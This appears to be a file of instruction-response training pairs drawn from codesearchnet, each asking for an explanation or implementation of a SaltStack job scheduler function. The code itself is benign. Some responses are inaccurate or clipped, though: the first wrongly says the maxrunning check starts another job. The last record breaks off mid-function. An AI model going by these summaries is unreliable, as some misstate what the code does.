{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _check_max_running(self, func, data, opts, now):\n        '''\n        Return the schedule data structure\n        '''\n        # Check to see if there are other jobs with this\n        # signature running.  If there are more than maxrunning\n        # jobs present then don't start another.\n        # If jid_include is False for this job we can ignore all this\n        # NOTE--jid_include defaults to True, thus if it is missing from the data\n        # dict we treat it like it was there and is True\n\n        # Check if we're able to run\n        if not data['run']:\n            return data\n        if 'jid_include' not in data or data['jid_include']:\n            jobcount = 0\n            if self.opts['__role'] == 'master':\n                current_jobs = salt.utils.master.get_running_jobs(self.opts)\n            else:\n                current_jobs = salt.utils.minion.running(self.opts)\n            for job in current_jobs:\n                if 'schedule' in job:\n                    log.debug(\n                        'schedule.handle_func: Checking job against fun '\n                        '%s: %s', func, job\n                    )\n                    if data['name'] == job['schedule'] \\\n                            and salt.utils.process.os_is_running(job['pid']):\n                        jobcount += 1\n                        log.debug(\n                            'schedule.handle_func: Incrementing jobcount, '\n                            'now %s, maxrunning is %s',\n                            jobcount, data['maxrunning']\n                        )\n                        if jobcount >= data['maxrunning']:\n                            log.debug(\n                                'schedule.handle_func: The scheduled job '\n                                '%s was not started, %s already running',\n                                data['name'], data['maxrunning']\n                            )\n                            data['_skip_reason'] = 'maxrunning'\n                            data['_skipped'] = True\n                            data['_skipped_time'] = now\n                            data['run'] = False\n                            return data\n        return data", "response": "Check to see if the job is still running and if so start another job if not"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef persist(self):\n        '''\n        Persist the modified schedule into <<configdir>>/<<default_include>>/_schedule.conf\n        '''\n        config_dir = self.opts.get('conf_dir', None)\n        if config_dir is None and 'conf_file' in self.opts:\n            config_dir = os.path.dirname(self.opts['conf_file'])\n        if config_dir is None:\n            config_dir = salt.syspaths.CONFIG_DIR\n\n        minion_d_dir = os.path.join(\n            config_dir,\n            os.path.dirname(self.opts.get('default_include',\n                                          salt.config.DEFAULT_MINION_OPTS['default_include'])))\n\n        if not os.path.isdir(minion_d_dir):\n            os.makedirs(minion_d_dir)\n\n        schedule_conf = os.path.join(minion_d_dir, '_schedule.conf')\n        log.debug('Persisting schedule')\n        schedule_data = self._get_schedule(include_pillar=False,\n                                           remove_hidden=True)\n        try:\n            with salt.utils.files.fopen(schedule_conf, 'wb+') as fp_:\n                fp_.write(\n                    salt.utils.stringutils.to_bytes(\n                        salt.utils.yaml.safe_dump(\n                            {'schedule': schedule_data}\n                        )\n                    )\n                )\n        except (IOError, OSError):\n            log.error('Failed to persist the updated schedule',\n                      exc_info_on_loglevel=logging.DEBUG)", "response": "Persist the modified schedule into the _schedule. conf file"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndeletes a job from the scheduler. Ignore jobs from pillar", "response": "def delete_job(self, name, persist=True):\n        '''\n        Deletes a job from the scheduler. Ignore jobs from pillar\n        '''\n        # ensure job exists, then delete it\n        if name in self.opts['schedule']:\n            del self.opts['schedule'][name]\n        elif name in self._get_schedule(include_opts=False):\n            log.warning(\"Cannot delete job %s, it's in the pillar!\", name)\n\n        # Fire the complete event back along with updated list of schedule\n        evt = salt.utils.event.get_event('minion', opts=self.opts, listen=False)\n        evt.fire_event({'complete': True,\n                        'schedule': self._get_schedule()},\n                       tag='/salt/minion/minion_schedule_delete_complete')\n\n        # remove from self.intervals\n        if name in self.intervals:\n            del self.intervals[name]\n\n        if persist:\n            self.persist()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nresets the scheduler to defaults", "response": "def reset(self):\n        '''\n        Reset the scheduler to defaults\n        '''\n        self.skip_function = None\n        self.skip_during_range = None\n        self.enabled = True\n        self.splay = None\n        self.opts['schedule'] = {}"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef delete_job_prefix(self, name, persist=True):\n        '''\n        Deletes a job from the scheduler. Ignores jobs from pillar\n        '''\n        # ensure job exists, then delete it\n        for job in list(self.opts['schedule'].keys()):\n            if job.startswith(name):\n                del self.opts['schedule'][job]\n        for job in self._get_schedule(include_opts=False):\n            if job.startswith(name):\n                log.warning(\"Cannot delete job %s, it's in the pillar!\", job)\n\n        # Fire the complete event back along with updated list of schedule\n        evt = salt.utils.event.get_event('minion', opts=self.opts, listen=False)\n        evt.fire_event({'complete': True,\n                        'schedule': self._get_schedule()},\n                       tag='/salt/minion/minion_schedule_delete_complete')\n\n        # remove from self.intervals\n        for job in list(self.intervals.keys()):\n            if job.startswith(name):\n                del self.intervals[job]\n\n        if persist:\n            self.persist()", "response": "Deletes a job from the scheduler. Ignores jobs from pillar\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_job(self, data, persist=True):\n        '''\n        Adds a new job to the scheduler. The format is the same as required in\n        the configuration file. See the docs on how YAML is interpreted into\n        python data-structures to make sure, you pass correct dictionaries.\n        '''\n\n        # we don't do any checking here besides making sure its a dict.\n        # eval() already does for us and raises errors accordingly\n        if not isinstance(data, dict):\n            raise ValueError('Scheduled jobs have to be of type dict.')\n        if not len(data) == 1:\n            raise ValueError('You can only schedule one new job at a time.')\n\n        # if enabled is not included in the job,\n        # assume job is enabled.\n        for job in data:\n            if 'enabled' not in data[job]:\n                data[job]['enabled'] = True\n\n        new_job = next(six.iterkeys(data))\n\n        if new_job in self._get_schedule(include_opts=False):\n            log.warning(\"Cannot update job %s, it's in the pillar!\", new_job)\n\n        elif new_job in self.opts['schedule']:\n            log.info('Updating job settings for scheduled job: %s', new_job)\n            self.opts['schedule'].update(data)\n\n        else:\n            log.info('Added new job %s to scheduler', new_job)\n            self.opts['schedule'].update(data)\n\n        # Fire the complete event back along with updated list of schedule\n        evt = salt.utils.event.get_event('minion', opts=self.opts, listen=False)\n        evt.fire_event({'complete': True,\n                        'schedule': self._get_schedule()},\n                       tag='/salt/minion/minion_schedule_add_complete')\n\n        if persist:\n            self.persist()", "response": "Adds a new job to the scheduler."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nmodifying a job in the scheduler. Ignores jobs from pillar", "response": "def modify_job(self, name, schedule, persist=True):\n        '''\n        Modify a job in the scheduler. Ignores jobs from pillar\n        '''\n        # ensure job exists, then replace it\n        if name in self.opts['schedule']:\n            self.delete_job(name, persist)\n        elif name in self._get_schedule(include_opts=False):\n            log.warning(\"Cannot modify job %s, it's in the pillar!\", name)\n            return\n\n        self.opts['schedule'][name] = schedule\n\n        if persist:\n            self.persist()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef run_job(self, name):\n        '''\n        Run a schedule job now\n        '''\n        data = self._get_schedule().get(name, {})\n\n        if 'function' in data:\n            func = data['function']\n        elif 'func' in data:\n            func = data['func']\n        elif 'fun' in data:\n            func = data['fun']\n        else:\n            func = None\n        if not isinstance(func, list):\n            func = [func]\n        for _func in func:\n            if _func not in self.functions:\n                log.error(\n                    'Invalid function: %s in scheduled job %s.',\n                    _func, name\n                )\n\n        if 'name' not in data:\n            data['name'] = name\n        log.info('Running Job: %s', name)\n\n        # Grab run, assume True\n        run = data.get('run', True)\n        if run:\n            self._run_job(_func, data)", "response": "Run a scheduled job now\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreloads the schedule from saved schedule file.", "response": "def reload(self, schedule):\n        '''\n        Reload the schedule from saved schedule file.\n        '''\n        # Remove all jobs from self.intervals\n        self.intervals = {}\n\n        if 'schedule' in schedule:\n            schedule = schedule['schedule']\n        self.opts.setdefault('schedule', {}).update(schedule)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nlist the current schedule items", "response": "def list(self, where):\n        '''\n        List the current schedule items\n        '''\n        if where == 'pillar':\n            schedule = self._get_schedule(include_opts=False)\n        elif where == 'opts':\n            schedule = self._get_schedule(include_pillar=False)\n        else:\n            schedule = self._get_schedule()\n\n        # Fire the complete event back along with the list of schedule\n        evt = salt.utils.event.get_event('minion', opts=self.opts, listen=False)\n        evt.fire_event({'complete': True, 'schedule': schedule},\n                       tag='/salt/minion/minion_schedule_list_complete')"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef save_schedule(self):\n        '''\n        Save the current schedule\n        '''\n        self.persist()\n\n        # Fire the complete event back along with the list of schedule\n        evt = salt.utils.event.get_event('minion', opts=self.opts, listen=False)\n        evt.fire_event({'complete': True},\n                       tag='/salt/minion/minion_schedule_saved')", "response": "Save the current schedule"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef skip_job(self, name, data):\n        '''\n        Skip a job at a specific time in the scheduler.\n        Ignores jobs from pillar\n        '''\n        time = data['time']\n        time_fmt = data.get('time_fmt', '%Y-%m-%dT%H:%M:%S')\n\n        # ensure job exists, then disable it\n        if name in self.opts['schedule']:\n            if 'skip_explicit' not in self.opts['schedule'][name]:\n                self.opts['schedule'][name]['skip_explicit'] = []\n            self.opts['schedule'][name]['skip_explicit'].append({'time': time,\n                                                                 'time_fmt': time_fmt})\n\n        elif name in self._get_schedule(include_opts=False):\n            log.warning(\"Cannot modify job %s, it's in the pillar!\", name)\n\n        # Fire the complete event back along with updated list of schedule\n        evt = salt.utils.event.get_event('minion', opts=self.opts, listen=False)\n        evt.fire_event({'complete': True,\n                        'schedule': self._get_schedule()},\n                       tag='/salt/minion/minion_schedule_skip_job_complete')", "response": "Skip a job at a specific time in the scheduler."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_next_fire_time(self, name, fmt='%Y-%m-%dT%H:%M:%S'):\n        '''\n        Return the next fire time for the specified job\n        '''\n\n        schedule = self._get_schedule()\n        _next_fire_time = None\n        if schedule:\n            _next_fire_time = schedule.get(name, {}).get('_next_fire_time', None)\n            if _next_fire_time:\n                _next_fire_time = _next_fire_time.strftime(fmt)\n\n        # Fire the complete event back along with updated list of schedule\n        evt = salt.utils.event.get_event('minion', opts=self.opts, listen=False)\n        evt.fire_event({'complete': True, 'next_fire_time': _next_fire_time},\n                       tag='/salt/minion/minion_schedule_next_fire_time_complete')", "response": "Return the next fire time for the specified job"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef handle_func(self, multiprocessing_enabled, func, data):\n        '''\n        Execute this method in a multiprocess or thread\n        '''\n        if salt.utils.platform.is_windows() \\\n                or self.opts.get('transport') == 'zeromq':\n            # Since function references can't be pickled and pickling\n            # is required when spawning new processes on Windows, regenerate\n            # the functions and returners.\n            # This also needed for ZeroMQ transport to reset all functions\n            # context data that could keep paretns connections. ZeroMQ will\n            # hang on polling parents connections from the child process.\n            if self.opts['__role'] == 'master':\n                self.functions = salt.loader.runner(self.opts, utils=self.utils)\n            else:\n                self.functions = salt.loader.minion_mods(self.opts, proxy=self.proxy, utils=self.utils)\n            self.returners = salt.loader.returners(self.opts, self.functions, proxy=self.proxy)\n        ret = {'id': self.opts.get('id', 'master'),\n               'fun': func,\n               'fun_args': [],\n               'schedule': data['name'],\n               'jid': salt.utils.jid.gen_jid(self.opts)}\n\n        if 'metadata' in data:\n            if isinstance(data['metadata'], dict):\n                ret['metadata'] = data['metadata']\n                ret['metadata']['_TOS'] = self.time_offset\n                ret['metadata']['_TS'] = time.ctime()\n                ret['metadata']['_TT'] = time.strftime('%Y %B %d %a %H %m', time.gmtime())\n            else:\n                log.warning('schedule: The metadata parameter must be '\n                            'specified as a dictionary.  Ignoring.')\n\n        if multiprocessing_enabled:\n            # We just want to modify the process name if we're on a different process\n            salt.utils.process.appendproctitle('{0} {1}'.format(self.__class__.__name__, ret['jid']))\n        data_returner = data.get('returner', None)\n\n        if not self.standalone:\n            proc_fn = os.path.join(\n                salt.minion.get_proc_dir(self.opts['cachedir']),\n                ret['jid']\n            )\n\n        if multiprocessing_enabled and not salt.utils.platform.is_windows():\n            # Reconfigure multiprocessing logging after daemonizing\n            log_setup.setup_multiprocessing_logging()\n\n        if multiprocessing_enabled:\n            # Don't *BEFORE* to go into try to don't let it triple execute the finally section.\n            salt.utils.process.daemonize_if(self.opts)\n\n        # TODO: Make it readable! Splt to funcs, remove nested try-except-finally sections.\n        try:\n\n            minion_blackout_violation = False\n            if self.opts.get('pillar', {}).get('minion_blackout', False):\n                whitelist = self.opts.get('pillar', {}).get('minion_blackout_whitelist', [])\n                # this minion is blacked out. Only allow saltutil.refresh_pillar and the whitelist\n                if func != 'saltutil.refresh_pillar' and func not in whitelist:\n                    minion_blackout_violation = True\n            elif self.opts.get('grains', {}).get('minion_blackout', False):\n                whitelist = self.opts.get('grains', {}).get('minion_blackout_whitelist', [])\n                if func != 'saltutil.refresh_pillar' and func not in whitelist:\n                    minion_blackout_violation = True\n            if minion_blackout_violation:\n                raise SaltInvocationError('Minion in blackout mode. Set \\'minion_blackout\\' '\n                                          'to False in pillar or grains to resume operations. Only '\n                                          'saltutil.refresh_pillar allowed in blackout mode.')\n\n            ret['pid'] = os.getpid()\n\n            if not self.standalone:\n                if 'jid_include' not in data or data['jid_include']:\n                    log.debug(\n                        'schedule.handle_func: adding this job to the '\n                        'jobcache with data %s', ret\n                    )\n                    # write this to /var/cache/salt/minion/proc\n                    with salt.utils.files.fopen(proc_fn, 'w+b') as fp_:\n                        fp_.write(salt.payload.Serial(self.opts).dumps(ret))\n\n            args = tuple()\n            if 'args' in data:\n                args = data['args']\n                ret['fun_args'].extend(data['args'])\n\n            kwargs = {}\n            if 'kwargs' in data:\n                kwargs = data['kwargs']\n                ret['fun_args'].append(copy.deepcopy(kwargs))\n\n            if func not in self.functions:\n                ret['return'] = self.functions.missing_fun_string(func)\n                salt.utils.error.raise_error(\n                    message=self.functions.missing_fun_string(func))\n\n            # if the func support **kwargs, lets pack in the pub data we have\n            # TODO: pack the *same* pub data as a minion?\n            argspec = salt.utils.args.get_function_argspec(self.functions[func])\n            if argspec.keywords:\n                # this function accepts **kwargs, pack in the publish data\n                for key, val in six.iteritems(ret):\n                    if key is not 'kwargs':\n                        kwargs['__pub_{0}'.format(key)] = copy.deepcopy(val)\n\n            # Only include these when running runner modules\n            if self.opts['__role'] == 'master':\n                jid = salt.utils.jid.gen_jid(self.opts)\n                tag = salt.utils.event.tagify(jid, prefix='salt/scheduler/')\n\n                event = salt.utils.event.get_event(\n                        self.opts['__role'],\n                        self.opts['sock_dir'],\n                        self.opts['transport'],\n                        opts=self.opts,\n                        listen=False)\n\n                namespaced_event = salt.utils.event.NamespacedEvent(\n                    event,\n                    tag,\n                    print_func=None\n                )\n\n                func_globals = {\n                    '__jid__': jid,\n                    '__user__': salt.utils.user.get_user(),\n                    '__tag__': tag,\n                    '__jid_event__': weakref.proxy(namespaced_event),\n                }\n                self_functions = copy.copy(self.functions)\n                salt.utils.lazy.verify_fun(self_functions, func)\n\n                # Inject some useful globals to *all* the function's global\n                # namespace only once per module-- not per func\n                completed_funcs = []\n\n                for mod_name in six.iterkeys(self_functions):\n                    if '.' not in mod_name:\n                        continue\n                    mod, _ = mod_name.split('.', 1)\n                    if mod in completed_funcs:\n                        continue\n                    completed_funcs.append(mod)\n                    for global_key, value in six.iteritems(func_globals):\n                        self.functions[mod_name].__globals__[global_key] = value\n\n            self.functions.pack['__context__']['retcode'] = 0\n\n            ret['return'] = self.functions[func](*args, **kwargs)\n\n            if not self.standalone:\n                # runners do not provide retcode\n                if 'retcode' in self.functions.pack['__context__']:\n                    ret['retcode'] = self.functions.pack['__context__']['retcode']\n\n                ret['success'] = True\n\n                if data_returner or self.schedule_returner:\n                    if 'return_config' in data:\n                        ret['ret_config'] = data['return_config']\n                    if 'return_kwargs' in data:\n                        ret['ret_kwargs'] = data['return_kwargs']\n                    rets = []\n                    for returner in [data_returner, self.schedule_returner]:\n                        if isinstance(returner, six.string_types):\n                            rets.append(returner)\n                        elif isinstance(returner, list):\n                            rets.extend(returner)\n                    # simple de-duplication with order retained\n                    for returner in OrderedDict.fromkeys(rets):\n                        ret_str = '{0}.returner'.format(returner)\n                        if ret_str in self.returners:\n                            self.returners[ret_str](ret)\n                        else:\n                            log.info(\n                                'Job %s using invalid returner: %s. Ignoring.',\n                                func, returner\n                            )\n\n        except Exception:\n            log.exception('Unhandled exception running %s', ret['fun'])\n            # Although catch-all exception handlers are bad, the exception here\n            # is to let the exception bubble up to the top of the thread context,\n            # where the thread will die silently, which is worse.\n            if 'return' not in ret:\n                ret['return'] = \"Unhandled exception running {0}\".format(ret['fun'])\n            ret['success'] = False\n            ret['retcode'] = 254\n        finally:\n            # Only attempt to return data to the master if the scheduled job is running\n            # on a master itself or a minion.\n            if '__role' in self.opts and self.opts['__role'] in ('master', 'minion'):\n                # The 'return_job' option is enabled by default even if not set\n                if 'return_job' in data and not data['return_job']:\n                    pass\n                else:\n                    # Send back to master so the job is included in the job list\n                    mret = ret.copy()\n                    # No returners defined, so we're only sending back to the master\n                    if not data_returner and not self.schedule_returner:\n                        mret['jid'] = 'req'\n                        if data.get('return_job') == 'nocache':\n                            # overwrite 'req' to signal to master that\n                            # this job shouldn't be stored\n                            mret['jid'] = 'nocache'\n                    load = {'cmd': '_return', 'id': self.opts['id']}\n                    for key, value in six.iteritems(mret):\n                        load[key] = value\n\n                    if '__role' in self.opts and self.opts['__role'] == 'minion':\n                        event = salt.utils.event.get_event('minion',\n                                                           opts=self.opts,\n                                                           listen=False)\n                    elif '__role' in self.opts and self.opts['__role'] == 'master':\n                        event = salt.utils.event.get_master_event(self.opts,\n                                                                  self.opts['sock_dir'])\n                    try:\n                        event.fire_event(load, '__schedule_return')\n                    except Exception as exc:\n                        log.exception('Unhandled exception firing __schedule_return event')\n\n            if not self.standalone:\n                log.debug('schedule.handle_func: Removing %s', proc_fn)\n\n                try:\n                    os.unlink(proc_fn)\n                except OSError as exc:\n                    if exc.errno == errno.EEXIST or exc.errno == errno.ENOENT:\n                        # EEXIST and ENOENT are OK because the file is gone and that's what\n                        # we wanted\n                        pass\n                    else:\n                        log.error(\"Failed to delete '%s': %s\", proc_fn, exc.errno)\n                        # Otherwise, failing to delete this file is not something\n                        # we can cleanly handle.\n                        raise\n                finally:\n                    if multiprocessing_enabled:\n                        # Let's make sure we exit the process!\n                        sys.exit(salt.defaults.exitcodes.EX_GENERIC)", "response": "Execute this method in a multiprocess or thread."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nevaluates and execute the schedule.", "response": "def eval(self, now=None):\n        '''\n        Evaluate and execute the schedule\n\n        :param datetime now: Override current time with a datetime object instance``\n\n        '''\n\n        log.trace('==== evaluating schedule now %s =====', now)\n\n        loop_interval = self.opts['loop_interval']\n        if not isinstance(loop_interval, datetime.timedelta):\n            loop_interval = datetime.timedelta(seconds=loop_interval)\n\n        def _splay(splaytime):\n            '''\n            Calculate splaytime\n            '''\n            splay_ = None\n            if isinstance(splaytime, dict):\n                if splaytime['end'] >= splaytime['start']:\n                    splay_ = random.randint(splaytime['start'],\n                                            splaytime['end'])\n                else:\n                    log.error('schedule.handle_func: Invalid Splay, '\n                              'end must be larger than start. Ignoring splay.')\n            else:\n                splay_ = random.randint(1, splaytime)\n            return splay_\n\n        def _handle_time_elements(data):\n            '''\n            Handle schedule item with time elements\n            seconds, minutes, hours, days\n            '''\n            if '_seconds' not in data:\n                interval = int(data.get('seconds', 0))\n                interval += int(data.get('minutes', 0)) * 60\n                interval += int(data.get('hours', 0)) * 3600\n                interval += int(data.get('days', 0)) * 86400\n\n                data['_seconds'] = interval\n\n                if not data['_next_fire_time']:\n                    data['_next_fire_time'] = now + datetime.timedelta(seconds=data['_seconds'])\n\n                if interval < self.loop_interval:\n                    self.loop_interval = interval\n\n                data['_next_scheduled_fire_time'] = now + datetime.timedelta(seconds=data['_seconds'])\n\n        def _handle_once(data, loop_interval):\n            '''\n            Handle schedule item with once\n            '''\n            if data['_next_fire_time']:\n                if data['_next_fire_time'] < now - loop_interval or \\\n                   data['_next_fire_time'] > now and \\\n                   not data['_splay']:\n                    data['_continue'] = True\n\n            if not data['_next_fire_time'] and \\\n                    not data['_splay']:\n                once = data['once']\n                if not isinstance(once, datetime.datetime):\n                    once_fmt = data.get('once_fmt', '%Y-%m-%dT%H:%M:%S')\n                    try:\n                        once = datetime.datetime.strptime(data['once'],\n                                                          once_fmt)\n                    except (TypeError, ValueError):\n                        data['_error'] = ('Date string could not '\n                                          'be parsed: {0}, {1}. '\n                                          'Ignoring job {2}.'.format(\n                                              data['once'],\n                                              once_fmt,\n                                              data['name']))\n                        log.error(data['_error'])\n                        return\n                data['_next_fire_time'] = once\n                data['_next_scheduled_fire_time'] = once\n                # If _next_fire_time is less than now, continue\n                if once < now - loop_interval:\n                    data['_continue'] = True\n\n        def _handle_when(data, loop_interval):\n            '''\n            Handle schedule item with when\n            '''\n            if not _WHEN_SUPPORTED:\n                data['_error'] = ('Missing python-dateutil. '\n                                  'Ignoring job {0}.'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            if not isinstance(data['when'], list):\n                _when_data = [data['when']]\n            else:\n                _when_data = data['when']\n\n            _when = []\n            for i in _when_data:\n                if ('pillar' in self.opts and 'whens' in self.opts['pillar'] and\n                        i in self.opts['pillar']['whens']):\n                    if not isinstance(self.opts['pillar']['whens'],\n                                      dict):\n                        data['_error'] = ('Pillar item \"whens\" '\n                                          'must be a dict. '\n                                          'Ignoring job {0}.'.format(data['name']))\n                        log.error(data['_error'])\n                        return\n                    when_ = self.opts['pillar']['whens'][i]\n                elif ('whens' in self.opts['grains'] and\n                      i in self.opts['grains']['whens']):\n                    if not isinstance(self.opts['grains']['whens'],\n                                      dict):\n                        data['_error'] = ('Grain \"whens\" must be a dict. '\n                                          'Ignoring job {0}.'.format(data['name']))\n                        log.error(data['_error'])\n                        return\n                    when_ = self.opts['grains']['whens'][i]\n                else:\n                    when_ = i\n\n                if not isinstance(when_, datetime.datetime):\n                    try:\n                        when_ = dateutil_parser.parse(when_)\n                    except ValueError:\n                        data['_error'] = ('Invalid date string {0}. '\n                                          'Ignoring job {1}.'.format(i, data['name']))\n                        log.error(data['_error'])\n                        return\n\n                _when.append(when_)\n\n            if data['_splay']:\n                _when.append(data['_splay'])\n\n            # Sort the list of \"whens\" from earlier to later schedules\n            _when.sort()\n\n            # Copy the list so we can loop through it\n            for i in copy.deepcopy(_when):\n                if len(_when) > 1:\n                    if i < now - loop_interval:\n                        # Remove all missed schedules except the latest one.\n                        # We need it to detect if it was triggered previously.\n                        _when.remove(i)\n\n            if _when:\n                # Grab the first element, which is the next run time or\n                # last scheduled time in the past.\n                when = _when[0]\n\n                if when < now - loop_interval and \\\n                        not data.get('_run', False) and \\\n                        not data.get('run', False) and \\\n                        not data['_splay']:\n                    data['_next_fire_time'] = None\n                    data['_continue'] = True\n                    return\n\n                if '_run' not in data:\n                    # Prevent run of jobs from the past\n                    data['_run'] = bool(when >= now - loop_interval)\n\n                if not data['_next_fire_time']:\n                    data['_next_fire_time'] = when\n\n                data['_next_scheduled_fire_time'] = when\n\n                if data['_next_fire_time'] < when and \\\n                        not run and \\\n                        not data['_run']:\n                    data['_next_fire_time'] = when\n                    data['_run'] = True\n\n            elif not data.get('_run', False):\n                data['_next_fire_time'] = None\n                data['_continue'] = True\n\n        def _handle_cron(data, loop_interval):\n            '''\n            Handle schedule item with cron\n            '''\n            if not _CRON_SUPPORTED:\n                data['_error'] = ('Missing python-croniter. '\n                                  'Ignoring job {0}.'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            if data['_next_fire_time'] is None:\n                # Get next time frame for a \"cron\" job if it has been never\n                # executed before or already executed in the past.\n                try:\n                    data['_next_fire_time'] = croniter.croniter(data['cron'], now).get_next(datetime.datetime)\n                    data['_next_scheduled_fire_time'] = croniter.croniter(data['cron'], now).get_next(datetime.datetime)\n                except (ValueError, KeyError):\n                    data['_error'] = ('Invalid cron string. '\n                                      'Ignoring job {0}.'.format(data['name']))\n                    log.error(data['_error'])\n                    return\n\n                # If next job run is scheduled more than 1 minute ahead and\n                # configured loop interval is longer than that, we should\n                # shorten it to get our job executed closer to the beginning\n                # of desired time.\n                interval = (now - data['_next_fire_time']).total_seconds()\n                if interval >= 60 and interval < self.loop_interval:\n                    self.loop_interval = interval\n\n        def _handle_run_explicit(data, loop_interval):\n            '''\n            Handle schedule item with run_explicit\n            '''\n            _run_explicit = []\n            for _run_time in data['run_explicit']:\n                if isinstance(_run_time, datetime.datetime):\n                    _run_explicit.append(_run_time)\n                else:\n                    _run_explicit.append(datetime.datetime.strptime(_run_time['time'],\n                                                                    _run_time['time_fmt']))\n            data['run'] = False\n\n            # Copy the list so we can loop through it\n            for i in copy.deepcopy(_run_explicit):\n                if len(_run_explicit) > 1:\n                    if i < now - loop_interval:\n                        _run_explicit.remove(i)\n\n            if _run_explicit:\n                if _run_explicit[0] <= now < _run_explicit[0] + loop_interval:\n                    data['run'] = True\n                    data['_next_fire_time'] = _run_explicit[0]\n\n        def _handle_skip_explicit(data, loop_interval):\n            '''\n            Handle schedule item with skip_explicit\n            '''\n            data['run'] = False\n\n            _skip_explicit = []\n            for _skip_time in data['skip_explicit']:\n                if isinstance(_skip_time, datetime.datetime):\n                    _skip_explicit.append(_skip_time)\n                else:\n                    _skip_explicit.append(datetime.datetime.strptime(_skip_time['time'],\n                                                                     _skip_time['time_fmt']))\n\n            # Copy the list so we can loop through it\n            for i in copy.deepcopy(_skip_explicit):\n                if i < now - loop_interval:\n                    _skip_explicit.remove(i)\n\n            if _skip_explicit:\n                if _skip_explicit[0] <= now <= (_skip_explicit[0] + loop_interval):\n                    if self.skip_function:\n                        data['run'] = True\n                        data['func'] = self.skip_function\n                    else:\n                        data['_skip_reason'] = 'skip_explicit'\n                        data['_skipped_time'] = now\n                        data['_skipped'] = True\n                        data['run'] = False\n            else:\n                data['run'] = True\n\n        def _handle_skip_during_range(data, loop_interval):\n            '''\n            Handle schedule item with skip_explicit\n            '''\n            if not _RANGE_SUPPORTED:\n                data['_error'] = ('Missing python-dateutil. '\n                                  'Ignoring job {0}.'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            if not isinstance(data['skip_during_range'], dict):\n                data['_error'] = ('schedule.handle_func: Invalid, range '\n                                  'must be specified as a dictionary. '\n                                  'Ignoring job {0}.'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            start = data['skip_during_range']['start']\n            end = data['skip_during_range']['end']\n            if not isinstance(start, datetime.datetime):\n                try:\n                    start = dateutil_parser.parse(start)\n                except ValueError:\n                    data['_error'] = ('Invalid date string for start in '\n                                      'skip_during_range. Ignoring '\n                                      'job {0}.'.format(data['name']))\n                    log.error(data['_error'])\n                    return\n\n            if not isinstance(end, datetime.datetime):\n                try:\n                    end = dateutil_parser.parse(end)\n                except ValueError:\n                    data['_error'] = ('Invalid date string for end in '\n                                      'skip_during_range. Ignoring '\n                                      'job {0}.'.format(data['name']))\n                    log.error(data['_error'])\n                    return\n\n            # Check to see if we should run the job immediately\n            # after the skip_during_range is over\n            if 'run_after_skip_range' in data and \\\n               data['run_after_skip_range']:\n                if 'run_explicit' not in data:\n                    data['run_explicit'] = []\n                # Add a run_explicit for immediately after the\n                # skip_during_range ends\n                _run_immediate = (end + loop_interval).strftime('%Y-%m-%dT%H:%M:%S')\n                if _run_immediate not in data['run_explicit']:\n                    data['run_explicit'].append({'time': _run_immediate,\n                                                 'time_fmt': '%Y-%m-%dT%H:%M:%S'})\n\n            if end > start:\n                if start <= now <= end:\n                    if self.skip_function:\n                        data['run'] = True\n                        data['func'] = self.skip_function\n                    else:\n                        data['_skip_reason'] = 'in_skip_range'\n                        data['_skipped_time'] = now\n                        data['_skipped'] = True\n                        data['run'] = False\n                else:\n                    data['run'] = True\n            else:\n                data['_error'] = ('schedule.handle_func: Invalid '\n                                  'range, end must be larger than '\n                                  'start. Ignoring job {0}.'.format(data['name']))\n                log.error(data['_error'])\n\n        def _handle_range(data):\n            '''\n            Handle schedule item with skip_explicit\n            '''\n            if not _RANGE_SUPPORTED:\n                data['_error'] = ('Missing python-dateutil. '\n                                  'Ignoring job {0}'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            if not isinstance(data['range'], dict):\n                data['_error'] = ('schedule.handle_func: Invalid, range '\n                                  'must be specified as a dictionary.'\n                                  'Ignoring job {0}.'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            start = data['range']['start']\n            end = data['range']['end']\n            if not isinstance(start, datetime.datetime):\n                try:\n                    start = dateutil_parser.parse(start)\n                except ValueError:\n                    data['_error'] = ('Invalid date string for start. '\n                                      'Ignoring job {0}.'.format(data['name']))\n                    log.error(data['_error'])\n                    return\n\n            if not isinstance(end, datetime.datetime):\n                try:\n                    end = dateutil_parser.parse(end)\n                except ValueError:\n                    data['_error'] = ('Invalid date string for end.'\n                                      ' Ignoring job {0}.'.format(data['name']))\n                    log.error(data['_error'])\n                    return\n\n            if end > start:\n                if 'invert' in data['range'] and data['range']['invert']:\n                    if now <= start or now >= end:\n                        data['run'] = True\n                    else:\n                        data['_skip_reason'] = 'in_skip_range'\n                        data['run'] = False\n                else:\n                    if start <= now <= end:\n                        data['run'] = True\n                    else:\n                        if self.skip_function:\n                            data['run'] = True\n                            data['func'] = self.skip_function\n                        else:\n                            data['_skip_reason'] = 'not_in_range'\n                            data['run'] = False\n            else:\n                data['_error'] = ('schedule.handle_func: Invalid '\n                                  'range, end must be larger '\n                                  'than start. Ignoring job {0}.'.format(data['name']))\n                log.error(data['_error'])\n\n        def _handle_after(data):\n            '''\n            Handle schedule item with after\n            '''\n            if not _WHEN_SUPPORTED:\n                data['_error'] = ('Missing python-dateutil. '\n                                  'Ignoring job {0}'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            after = data['after']\n            if not 